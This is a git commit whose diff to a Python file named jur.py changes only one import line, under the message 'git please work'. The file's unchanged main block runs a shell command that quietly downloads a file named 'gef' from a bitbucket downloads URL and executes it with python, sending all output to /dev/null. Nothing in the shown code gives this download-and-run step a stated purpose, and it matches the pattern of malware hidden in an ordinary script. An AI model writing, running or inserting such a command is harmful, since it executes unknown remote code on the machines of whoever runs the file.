d2e826be08ad5597c122ef00552a9b7d3c946194
gakira munshi <gakimarki@proton.me>
2024-12-07 06:35:33 -0500

    git please work

--- jur.py
+++ jur.py
@@ -1,3 +1,3 @@
-import os, sys,difflib
+import os, sys,enum
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
